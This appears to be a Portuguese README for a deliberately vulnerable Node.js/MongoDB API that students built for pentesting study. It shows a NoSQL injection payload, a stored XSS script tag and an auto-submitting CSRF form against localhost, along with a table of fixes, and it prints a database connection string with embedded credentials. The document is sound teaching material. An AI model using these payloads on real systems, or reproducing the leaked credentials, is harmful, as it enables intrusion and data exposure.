# API-Vulnerável - Projeto de Estudo de Pentesting em Aplicações Node.js (Versão 1.0)

Este projeto consiste em uma API RESTful propositalmente vulnerável, desenvolvida com Node.js, Express e MongoDB.  
O objetivo é demonstrar na prática vulnerabilidades comuns em aplicações web, incluindo **NoSQL Injection**, **XSS (Cross Site Scripting)** e **CSRF (Cross Site Request Forgery)**.

---

## Instalação das Dependências

```bash
npm install
```

ou

```bash
yarn install
```

---

## Como Rodar a Aplicação Localmente

1. Crie um arquivo `.env` na raiz do projeto com as seguintes variáveis:

```
PORT=3000
MONGODB_URI=mongodb+srv://admin:adminsenha@cluster0.ddytvld.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0
```

2. Inicie o servidor:

```bash
node app.js
```

A aplicação estará disponível em:

```
http://localhost:3000
```

---

## Endpoints Disponíveis

### Criar Usuário

**POST** `/users`

```json
{
  "username": "admin",
  "email": "admin@example.com",
  "password": "123456"
}
```

### Buscar Todos os Usuários

**GET** `/users`

### Atualizar Usuário

**PUT** `/users/:id`

```json
{
  "username": "adminAtualizado"
}
```

### Deletar Usuário

**DELETE** `/users/:id`

---

## Ataques Demonstrados

### 1️ NoSQL Injection

**Como realizar:**

**POST** `/users/find` com o payload:

```json
{
  "username": { "$ne": null }
}
```

**Resultado:**
- A API retorna todos os usuários, ignorando filtros → demonstração de uma injeção NoSQL bem sucedida.

---

### 2️ Cross Site Scripting (XSS)

**Como realizar:**

**POST** `/users` criando usuário com:

```json
{
  "username": "<script>alert('XSS Ativo')</script>",
  "email": "xss@example.com",
  "password": "123456"
}
```

**Resultado:**
- Quando listados com **GET /users**, os dados voltam exatamente como foram inseridos.
- Em uma aplicação frontend que renderize este dado, o script será executado → demonstrando XSS Armazenado.

---

### 3️ Cross Site Request Forgery (CSRF)

**Como realizar:**

Criar um arquivo `index.html` com:

```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF Attack Test</h1>

<form action="http://localhost:3000/users" method="POST">
  <input type="hidden" name="username" value="csrf_injected_user">
  <input type="hidden" name="email" value="csrf@example.com">
  <input type="hidden" name="password" value="123456">
</form>

<script>
  document.forms[0].submit();
</script>

</body>
</html>
```

**Resultado:**
- Um usuário é criado na API sem o consentimento da vítima → CSRF realizado com sucesso.

---

## Relatórios

### Sumário Executivo

Este projeto é uma simulação educativa de uma API RESTful com vulnerabilidades propositalmente expostas.  
O objetivo é demonstrar na prática como entradas maliciosas podem comprometer a aplicação e o banco de dados.  
As vulnerabilidades incluídas (NoSQL Injection, XSS e CSRF) representam falhas críticas comuns que, se não tratadas, podem ser exploradas em ambientes reais.

---

### Relatório Técnico

| Vulnerabilidade | Como é explorada | Consequências | Como corrigir |
|-----------------|------------------|---------------|---------------|
| NoSQL Injection | Enviando payloads especiais para consultas sem validação | Vazamento e manipulação de dados | Validação de entradas e parametrização |
| XSS (Stored) | Inserção de scripts em campos aceitos pela API | Execução de código malicioso no navegador da vítima | Sanitização de entradas e saídas + CSP |
| CSRF | Criação de requisições maliciosas automáticas vindas de outro site | Execução de ações sem consentimento do usuário | Uso de tokens anti-CSRF e autenticação via JWT |

---

##  Autores

- Andressa Lopes
- Davi Pereira
- Gustavo Marcelino
- Rebeca Lara
- Stefani Santana
